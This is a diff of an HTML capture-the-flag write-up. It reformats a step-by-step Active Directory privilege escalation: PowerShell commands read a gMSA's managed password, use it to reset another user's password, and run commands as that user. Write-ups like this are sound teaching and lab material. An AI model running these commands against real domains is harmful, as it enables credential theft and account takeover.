@@ -334,33 +334,28 @@ Host script results:
 <p><em>In order to be able to run code as</em> <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA</code>, we’re going to do a couple of things:</p>
 
 <ol>
-  <li>Obtain the <strong>GMSA</strong> password as a secure string. This can be done with the below command:</li>
-</ol>
-
-<p><code class="language-plaintext highlighter-rouge">$secstringpassword = (ConvertFrom-ADManagedPasswordBlob (get-adserviceaccount -filter * -Properties msDS-ManagedPassword).'msDS-ManagedPassword').SecureCurrentPassword</code></p>
-
-<ol>
-  <li>Create a <code class="language-plaintext highlighter-rouge">PSCredential</code> object with both the <strong>GMSA</strong> username and the secure string.</li>
-</ol>
-
-<p><code class="language-plaintext highlighter-rouge">$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $secstringpassword</code></p>
-
-<ol>
+  <li>Obtain the <strong>GMSA</strong> password as a secure string. This can be done with the below command:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$secstringpassword = (ConvertFrom-ADManagedPasswordBlob (get-adserviceaccount -filter * -Properties msDS-ManagedPassword).'msDS-ManagedPassword').SecureCurrentPassword
+</code></pre></div>    </div>
+  </li>
+  <li>Create a <code class="language-plaintext highlighter-rouge">PSCredential</code> object with both the <strong>GMSA</strong> username and the secure string.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $secstringpassword
+</code></pre></div>    </div>
+  </li>
   <li>Execute a password reset command using the created <code class="language-plaintext highlighter-rouge">PSCredential</code>:
     <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$Script = {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)}`
 Invoke-Command -ComputerName 127.0.0.1 -credential $cred -ScriptBlock $Script
 </code></pre></div>    </div>
   </li>
-  <li>Create another <code class="language-plaintext highlighter-rouge">PSCredential</code> object but with <code class="language-plaintext highlighter-rouge">tristan</code>’s new password:</li>
+  <li>Create another <code class="language-plaintext highlighter-rouge">PSCredential</code> object but with <code class="language-plaintext highlighter-rouge">tristan</code>’s new password:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$killercreds = New-Object System.Management.Automation.PSCredential Tristan.Davies, (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)`
+</code></pre></div>    </div>
+  </li>
+  <li>Execute commands as <code class="language-plaintext highlighter-rouge">tristan</code> using the new credential object:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command -ComputerName 127.0.0.1 -credential $killercreds -ScriptBlock {whoami}
+</code></pre></div>    </div>
+  </li>
 </ol>
-
-<p><code class="language-plaintext highlighter-rouge">$killercreds = New-Object System.Management.Automation.PSCredential Tristan.Davies, (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)</code></p>
-
-<ol>
-  <li>Execute commands as <code class="language-plaintext highlighter-rouge">tristan</code> using the new credential object:</li>
-</ol>
-
-<p><code class="language-plaintext highlighter-rouge">Invoke-Command -ComputerName 127.0.0.1 -credential $killercreds -ScriptBlock {whoami}</code></p>
 
 <p><img src="/assets/Search/tristan-web-access.jpg" alt="tristan-web-access" /></p>
 
